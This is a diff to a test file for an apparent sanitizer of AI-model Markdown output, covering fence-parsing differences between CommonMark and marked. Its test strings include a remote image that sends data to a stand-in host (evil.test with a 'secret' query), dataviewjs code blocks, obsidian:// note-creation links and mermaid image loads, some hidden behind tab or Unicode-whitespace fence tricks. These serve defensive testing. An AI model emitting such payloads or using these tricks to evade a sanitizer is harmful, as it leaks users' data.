@@ -1,5 +1,6 @@
 import { describe, expect, test } from "bun:test";
-import { findLenientFenceCloser, scanFences } from "../src/safety/markdownFences";
+import { createScanBudget } from "../src/safety/scan";
+import { fenceCloserDoubt, findLenientFenceCloser, scanFences } from "../src/safety/markdownFences";
 import { sanitizeModelMarkdown, sanitizeModelMarkdownDetailed } from "../src/safety/sanitize";
 import { prepareModelOutputForWrite } from "../src/safety/writePath";
 
@@ -71,6 +72,169 @@ describe("findLenientFenceCloser", () => {
 
 	test("ignores lines that carry text after the fence characters and other fence characters", () => {
 		expect(findLenientFenceCloser(["```js", "~~~", "````"], 0, fence)).toBe(2);
+	});
+
+	test("takes only a closer that every parser takes: a run and spaces, with no tab and no further fence characters", () => {
+		// marked ends a fence at "```~" and not at "```" plus a tab; CommonMark the other way round. The later reading wins.
+		expect(findLenientFenceCloser(["```\t", "```~", "``` \t", "```~`", "```  ", "tail"], 0, fence)).toBe(4);
+		expect(findLenientFenceCloser(["```\t", "```~"], 0, fence)).toBe(2);
+		expect(findLenientFenceCloser(["   ```   "], 0, fence)).toBe(0);
+	});
+});
+
+describe("fenceCloserDoubt", () => {
+	const doubtOf = (text: string, which = 0) => fenceCloserDoubt(lines(text), scanFences(lines(text))[which]);
+
+	test("a plain closing line leaves no doubt, with or without trailing spaces or a longer run", () => {
+		expect(doubtOf("```js\ncode\n```")).toBe("none");
+		expect(doubtOf("```js\ncode\n```   ")).toBe("none");
+		expect(doubtOf("```js\ncode\n`````")).toBe("none");
+		expect(doubtOf("~~~\ncode\n~~~~")).toBe("none");
+		expect(doubtOf("```js\ncode")).toBe("none");
+	});
+
+	test("lines that are no closer in any reading do not count: a shorter run, another character, an info string", () => {
+		expect(doubtOf("````md\n```js\nx\n```\n````")).toBe("none");
+		expect(doubtOf("```\n~~~\nx\n```")).toBe("none");
+		expect(doubtOf("```\n```js\nx\n```")).toBe("none");
+		expect(doubtOf("```\n``` text\nx\n```")).toBe("none");
+	});
+
+	test("a line that closes the fence only for a parser that takes more fence characters after the run is early", () => {
+		expect(doubtOf("```js\ncode\n```~\nrest")).toBe("early");
+		expect(doubtOf("~~~js\ncode\n~~~`\nrest")).toBe("early");
+		expect(doubtOf("```js\ncode\n```~`\n```")).toBe("early");
+		expect(doubtOf("```js\ncode\n```~ \nrest")).toBe("early");
+	});
+
+	test("an indented or quoted look-alike of a closer is early too, since parsers differ on how much of either a closer may carry", () => {
+		expect(doubtOf("```js\n    ```\ntail\n```")).toBe("early");
+		expect(doubtOf("```js\n\t```\ntail\n```")).toBe("early");
+		expect(doubtOf("```js\n> ```\ntail\n```")).toBe("early");
+	});
+
+	test("a closing line with a tab after the run is late, and late wins over early", () => {
+		expect(doubtOf("```js\ncode\n```\t")).toBe("late");
+		expect(doubtOf("```js\ncode\n``` \t ")).toBe("late");
+		expect(doubtOf("```js\n```~\n```\t")).toBe("late");
+		expect(doubtOf("- ```js\n  code\n  ```\t")).toBe("late");
+		expect(doubtOf("> ```js\n> code\n> ```\t")).toBe("late");
+	});
+
+	test("a tab inside the body or before the run does not count", () => {
+		expect(doubtOf("```js\n\tcode\t\n```")).toBe("none");
+		expect(doubtOf("- ```js\n  code\n\t```")).toBe("none");
+	});
+
+	test("with no work budget left the answer is late", () => {
+		const text = "```js\na\nb\nc\n```";
+		expect(fenceCloserDoubt(lines(text), scanFences(lines(text))[0], createScanBudget(1))).toBe("late");
+		expect(fenceCloserDoubt(lines(text), scanFences(lines(text))[0], createScanBudget(1000))).toBe("none");
+	});
+});
+
+describe("sanitizeModelMarkdown: closing lines that parsers read differently", () => {
+	const image = "![x](https://evil.test/a.png?d=secret)";
+	const remote = "[Remote image: x](https://evil.test/a.png?d=secret)";
+
+	test("a closer followed by a mixed fence character no longer hides what follows", () => {
+		// marked ends the fence at "```~", CommonMark keeps it open to the end.
+		const backtick = sanitizeModelMarkdownDetailed(`\`\`\`js\ncode\n\`\`\`~\n\n${image}\n`);
+		expect(backtick.text).toContain(remote);
+		expect(backtick.findings.map((finding) => finding.kind)).toContain("remote-image");
+		const tilde = sanitizeModelMarkdown("~~~js\ncode\n~~~`\n\n[x](obsidian://new?vault=v&name=n&content=c)\n");
+		expect(tilde).not.toContain("](obsidian://");
+		const dataview = sanitizeModelMarkdown("```js\ncode\n```~\n\n```dataviewjs\ndv.paragraph(app.vault.getName())\n```\n");
+		expect(dataview).not.toMatch(/```dataviewjs/);
+	});
+
+	test("a closer followed by a tab no longer hides what follows", () => {
+		// CommonMark closes the fence at "```\t", marked does not, so for marked the next "```" closes it and the image is text.
+		const text = `\`\`\`js\ncode\n\`\`\`\t\n\`\`\`\n${image}`;
+		expect(sanitizeModelMarkdown(text)).toEndWith(remote);
+		expect(prepareModelOutputForWrite(text).findings.map((finding) => finding.kind)).toEqual(["remote-image"]);
+	});
+
+	test("a diagram closed by a tab line is judged together with what follows it", () => {
+		const text = "```mermaid\nflowchart TD\n  A-->B\n```\t\nA@{ img: \"https://evil.test/x.png\" }\n```";
+		const result = sanitizeModelMarkdownDetailed(text);
+		expect(result.text.startsWith("```text\n")).toBe(true);
+		expect(result.mermaid).toHaveLength(1);
+		expect(result.mermaid[0]).toMatchObject({ downgraded: true, closed: true, source: "flowchart TD\n  A-->B" });
+		expect(result.findings.map((finding) => finding.kind)).toEqual(["unsafe-diagram"]);
+	});
+
+	test("a diagram with an ordinary closer is not affected", () => {
+		const text = "```mermaid\nflowchart TD\n  A-->B\n```\n\nSome text.\n";
+		expect(sanitizeModelMarkdown(text)).toBe(text);
+		expect(sanitizeModelMarkdown("```mermaid\nflowchart TD\n  A-->B\n```  \n\nSome text.\n")).toBe("```mermaid\nflowchart TD\n  A-->B\n```  \n\nSome text.\n");
+	});
+
+	test("the result is stable: a second pass changes nothing", () => {
+		for (const text of [
+			`\`\`\`js\ncode\n\`\`\`~\n\n${image}\n`,
+			`~~~js\ncode\n~~~\`\n\n${image}\n`,
+			`\`\`\`js\ncode\n\`\`\`\t\n\`\`\`\n${image}`,
+			"```mermaid\nflowchart TD\n  A-->B\n```\t\nA@{ img: \"https://evil.test/x.png\" }\n```"
+		]) {
+			const once = sanitizeModelMarkdown(text);
+			expect(sanitizeModelMarkdown(once)).toBe(once);
+		}
+	});
+
+	test("code that ends in the ordinary way keeps its content, so does a closer with trailing spaces or a longer run", () => {
+		for (const closer of ["```", "```   ", "````"]) {
+			const text = `\`\`\`md\n${image}\n${closer}\n\n\`\`\`md\n${image}\n\`\`\`\n`;
+			expect(sanitizeModelMarkdown(text)).toBe(text);
+		}
+	});
+
+	test("a code example that shows a shorter fence, or a fence with an info string, inside a longer one is left alone", () => {
+		const nested = `\`\`\`\`md\n\`\`\`js\n${image}\n\`\`\`\n\`\`\`\`\n\n\`\`\`md\n${image}\n\`\`\`\n`;
+		expect(sanitizeModelMarkdown(nested)).toBe(nested);
+		// No parser closes the fence at "```js", so it is body text and the fence stays trusted.
+		const labelled = `\`\`\`\n\`\`\`js\n${image}\n\`\`\`\n\n\`\`\`md\n${image}\n\`\`\`\n`;
+		expect(sanitizeModelMarkdown(labelled)).toBe(labelled);
+	});
+});
+
+describe("sanitizeModelMarkdown: task list items", () => {
+	test("a fence opener after a task checkbox is relabelled like any other opener", () => {
+		const code = "  dv.paragraph(app.vault.getName())\n  ```\n";
+		expect(sanitizeModelMarkdown(`- [ ] \`\`\`dataviewjs\n${code}`)).toBe(`- [ ] \`\`\`text\n${code}`);
+		expect(sanitizeModelMarkdown(`- [x] \`\`\`dataviewjs\n${code}`)).toBe(`- [x] \`\`\`text\n${code}`);
+		expect(sanitizeModelMarkdown(`1. [X] \`\`\`dataviewjs\n${code}`)).toBe(`1. [X] \`\`\`text\n${code}`);
+		expect(sanitizeModelMarkdown(`> - [ ] \`\`\`dataviewjs\n> ${code}`)).toBe(`> - [ ] \`\`\`text\n> ${code}`);
+		expect(sanitizeModelMarkdown(`* [/] ~~~dataviewjs\n${code}`)).toBe(`* [/] ~~~text\n${code}`);
+		expect(sanitizeModelMarkdown(`-\t[ ]\t\`\`\`dataviewjs\n${code}`)).toBe(`-\t[ ]\t\`\`\`text\n${code}`);
+		expect(sanitizeModelMarkdown(`- [ ] - [ ] \`\`\`dataviewjs\n${code}`)).toBe(`- [ ] - [ ] \`\`\`text\n${code}`);
+	});
+
+	test("a diagram opened after a task checkbox is judged", () => {
+		const bad = "- [ ] ```mermaid\n  flowchart TD\n  A@{ img: \"https://evil.test/x.png\" }\n  ```\n";
+		expect(sanitizeModelMarkdown(bad)).toStartWith("- [ ] ```text\n");
+		// The scanner does not see this fence, so the diagram is judged as written, to the end of the reply: its own closing
+		// line counts against it. A diagram in a task item is shown as code, which is the price of not guessing.
+		const unseen = "- [ ] ```mermaid\n  flowchart TD\n  A-->B\n  ```\n";
+		expect(sanitizeModelMarkdown(unseen)).toStartWith("- [ ] ```text\n");
+		const listed = "- [ ] task\n\n  ```mermaid\n  flowchart TD\n  A-->B\n  ```\n";
+		expect(sanitizeModelMarkdown(listed)).toBe(listed);
+	});
+
+	test("the sanitiser's finding for it carries the same identity as any plugin fence", () => {
+		const result = sanitizeModelMarkdownDetailed("- [ ] ```dataviewjs\n  x\n  ```\n");
+		expect(result.findings.map((finding) => finding.kind)).toEqual(["plugin-fence"]);
+		expect(prepareModelOutputForWrite("- [ ] ```dataviewjs\n  x\n  ```\n").text).toStartWith("- [ ] ```text");
+	});
+
+	test("a fence the scanner cannot see leaves the fences after it unprotected", () => {
+		const text = "- [ ] ```js\n  code\n  ```\n\n```md\n![x](https://evil.test/a.png?d=secret)\n```\n";
+		expect(sanitizeModelMarkdown(text)).toContain("[Remote image: x]");
+	});
+
+	test("ordinary task items and inline code in them are left alone", () => {
+		const text = "- [ ] write the report\n- [x] run ```npm install``` first\n- [ ] ```js inline``` text\n- [/] see [the docs](https://example.com)\n1. [ ] `code`\n";
+		expect(sanitizeModelMarkdown(text)).toBe(text);
 	});
 });
 
@@ -219,5 +383,78 @@ describe("sanitizeModelMarkdownDetailed: passes", () => {
 		const written = prepareModelOutputForWrite(text, { sourceText: source });
 		expect(written.text.match(/<style>/g)?.length).toBe(1);
 		expect(written.text).toContain("&lt;style>");
+	});
+});
+
+describe("sanitizeModelMarkdown: white space that CommonMark and marked do not count", () => {
+	const image = "![x](https://evil.test/a.png?d=secret)";
+	const remote = "[Remote image: x](https://evil.test/a.png?d=secret)";
+	// JavaScript's trim and \s take these for white space. CommonMark and marked indent and blank a line with the space and
+	// the tab only, and a regular expression `.` stops at the two separators, which are no line ending to either parser.
+	const LEADS = ["\u00a0", "\u3000", "\u2003", "\u202f", "\u1680", "\u000b", "\u000c", "\ufeff"];
+	const SEPARATORS = ["\u2028", "\u2029"];
+
+	test("an opener led by such white space is text, so the image after it is still checked", () => {
+		for (const lead of LEADS) {
+			expect(sanitizeModelMarkdown(`${lead}\`\`\`js\n${image}\n`)).toContain(remote);
+			const hidden = sanitizeModelMarkdown(`${lead}\`\`\`js\n\`\`\`dataviewjs\ndv.paragraph(app.vault.getName())\n\`\`\`\`\n`);
+			expect(hidden).toContain("```text\n");
+			expect(hidden).not.toContain("```dataviewjs");
+		}
+	});
+
+	test("a closer led by such white space is code, so the fences after it are not read the wrong way round", () => {
+		for (const lead of LEADS) {
+			expect(sanitizeModelMarkdown(`\`\`\`js\ncode\n${lead}\`\`\`\ntext\n\`\`\`\n${image}\n`)).toContain(remote);
+		}
+	});
+
+	test("a separator in the info string does not hide the opener from the scanner", () => {
+		for (const separator of SEPARATORS) {
+			expect(sanitizeModelMarkdown(`\`\`\`js${separator}x\ncode\n\`\`\`\n${image}\n`)).toContain(remote);
+			expect(sanitizeModelMarkdown(`~~~${separator}\ncode\n~~~\n${image}\n`)).toContain(remote);
+			const diagram = sanitizeModelMarkdownDetailed(`\`\`\`mermaid${separator}x\nflowchart TD\nA@{ img: "https://evil.test/x.png" }\n\`\`\`\n`);
+			expect(diagram.findings.map((finding) => finding.kind)).toEqual(["unsafe-diagram"]);
+			// A fence that is read, and read the way the parsers read it, keeps its code as written.
+			const code = `\`\`\`md${separator}x\n${image}\n\`\`\`\n`;
+			expect(sanitizeModelMarkdown(code)).toBe(code);
+		}
+	});
+
+	test("the write path neutralises the same shapes", () => {
+		for (const lead of LEADS.filter((char) => char !== "\ufeff")) {
+			expect(prepareModelOutputForWrite(`${lead}\`\`\`js\n${image}\n`).text).toContain(remote);
+			expect(prepareModelOutputForWrite(`\`\`\`js\ncode\n${lead}\`\`\`\ntext\n\`\`\`\n${image}\n`).text).toContain(remote);
+		}
+		for (const separator of SEPARATORS) {
+			expect(prepareModelOutputForWrite(`\`\`\`js${separator}x\ncode\n\`\`\`\n${image}\n`).text).toContain(remote);
+		}
+	});
+
+	test("a line of such white space is blank to marked, so nothing after it is copied through unread", () => {
+		for (const lead of LEADS) {
+			// marked lets the list item run on over the blank line and ends it at the quote; CommonMark ends it at the text line.
+			const text = `* a\n\n${lead}\n   \`\`\`js\n> \`= this.file.name\`\n`;
+			expect(sanitizeModelMarkdown(text)).toContain("`\u200b= this.file.name`");
+			const nested = `* a\n  \`\`\`js\n  code\n${lead}\n  \`\`\`\n${image}\n`;
+			expect(sanitizeModelMarkdown(nested)).toContain(remote);
+		}
+	});
+
+	test("a line of spaces and tabs is blank to every parser and does not cost the fences after it their trust", () => {
+		const text = `Intro\n \t \n\`\`\`md\n${image}\n\`\`\`\n`;
+		expect(sanitizeModelMarkdown(text)).toBe(text);
+	});
+
+	test("a list item's fence that its container ends is checked up to a closer every parser takes", () => {
+		// marked reads the "````` <tab>" line as code and carries the diagram on to the end; CommonMark closes at it.
+		const text = '- \n  ````mermaid\n  flowchart TD\n ````` \t\nA@{ img: "https://evil.test/x.png" }\n';
+		const result = sanitizeModelMarkdownDetailed(text);
+		expect(result.text).toStartWith("- \n  ````text\n");
+		expect(result.findings.map((finding) => finding.kind)).toEqual(["unsafe-diagram"]);
+		expect(sanitizeModelMarkdown(result.text)).toBe(result.text);
+		// With a closer both parsers take, the diagram ends there and is judged on its own.
+		const plain = "- \n  ````mermaid\n  flowchart TD\n  A-->B\n `````\n\nafter\n";
+		expect(sanitizeModelMarkdown(plain)).toBe(plain);
 	});
 });
